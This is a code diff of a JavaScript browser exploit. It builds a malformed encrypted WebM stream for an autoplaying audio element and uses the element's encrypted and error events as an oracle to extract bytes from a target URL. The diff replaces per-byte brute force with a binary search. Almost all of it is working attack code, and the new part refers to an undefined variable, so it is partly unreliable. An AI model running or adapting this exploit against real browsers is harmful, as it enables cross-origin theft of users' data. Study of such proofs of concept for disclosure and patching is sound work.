@@ -1,12 +1,11 @@
 <audio autoplay></audio>
 <script>
 audio=document.querySelector('audio');
-guess=function (o, g){
+guess=function (o, g, le){
 return new Promise(function(resolve, reject){
 url=location.search.slice(1);
 audio.onencrypted=resolve;
 audio.onerror=reject;
-le=Math.floor(((0x7FFFFFFF)/8-128*128-(128*(g*256+255)))/(g*256+128+255));
 b1=(le>>8)%0xFF;
 b2=(le)%0xFF;
 offset=(o)%0x7F;
@@ -28,22 +27,15 @@ String.fromCharCode(
 0x00,0x4D,0x80,0x8F,0x6C,0x69,0x62,0x77,0x65,0x62,0x6D,0x2D,0x30,0x2E,0x32,0x2E,
 0x31,0x2E,0x30,0x57,0x41,0x92,0x77,0x65,0x62,0x6D,0x5F,0x63,0x72,0x79,0x70,0x74,
 0x20,0x30,0x2E,0x33,0x2E,0x31,0x2E,0x30,0x16,0x54,0xAE,0x6B,
-
-
 0x4F,0xCF,
-
 0xAE,
-
 0xEF,
-
-
 // encrypted metadata
 0xD7,0x81,0x01,0x73,0xC5,0x87,0x5B,0x14,0xFF,0x9A,0x8F,0xE4,0xBF,0x83,0x81,0x01,
 0x86,0x85,0x56,0x5F,0x56,0x50,0x38,0x6D,0x80,0xB0,0x62,0x40,0xAD,0x50,0x31,0x81,
 0x00,0x50,0x32,0x81,0x01,0x50,0x33,0x81,0x01,0x50,0x35,0x9E,0x47,0xE1,0x81,0x05,
 0x47,0xE2,0x90,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x31,0x32,
 0x33,0x34,0x35,0x47,0xE7,0x84,0x47,0xE8,0x81,0x01,
-
   0x22, 0xB5, 0x9C, // Dummy Track Language
   offset+0x80
 )+
@@ -57,35 +49,60 @@ String.fromCharCode(
    /* } */
    0xB0, 0x82
    /* { */
-      //, g, 0x00
+      //, g, 0xFF
    /* } */
 /* }*/
 )))+':'+escape(JSON.stringify({status:206,headers:{'content-range':'bytes 0-'+(totalLength-3)+'/'+totalLength}}));
 });
 };
+function getComplement2(x){return 0x7FFFFFFF/(8*(x+128))-128}
+function getChar(o){
+left=1;
+right=0xffff;
+test=Math.floor((left+right)/2);
+
+function getNext() {
+  middle=Math.floor((left+right)/2);
+  if(middle==test||middle==left)
+    middle++;
+  return middle;
+}
+
+function cycle(answer) {
+  if(answer) {
+    left=test;
+  } else {
+    right=test;
+  }
+}
+
+function ask() {
+  //return Promise.resolve(test<1337);
+  return new Promise(function(resolve){guess(o, i, test).then(resolve.bind(null, true)).catch(resolve.bind(null, false))});
+}
+
+function binsearch() {
+  if(test==right)return Promise.resolve(test);
+  return ask().then(function(result) {
+    console.log('@', i, ':', left, '<', test, '<', right, '=', result);
+    cycle(result);
+    test = getNext();
+  }).then(binsearch);
+}
+return binsearch();
+}
+
 stop=false;
 function bf() {
   var offset = 1;
-  var char = 0x10;
   var buffer = [];
   var loop = function() {
     console.log('>>>', String.fromCharCode.apply(String, buffer), offset, char);
-    if(stop || offset > 0x7e)return;
-    guess(offset, char).then(function() {
+    if(stop)return;
+    getChar(offset).then(function(char) {
       buffer.push(char);
-      char = 0x10;
       offset++;
       console.log('>>', offset, char);
-      setTimeout(loop, 100);
-    }).catch(function() {
-      char++;
-      if (char>127) {
-        console.log('>>!', offset, char);
-        char=0x10;
-        offset++;
-        buffer.push(0xFFFD);
-      }
-      console.log('>', offset, char);
       setTimeout(loop, 100);
     });
   };
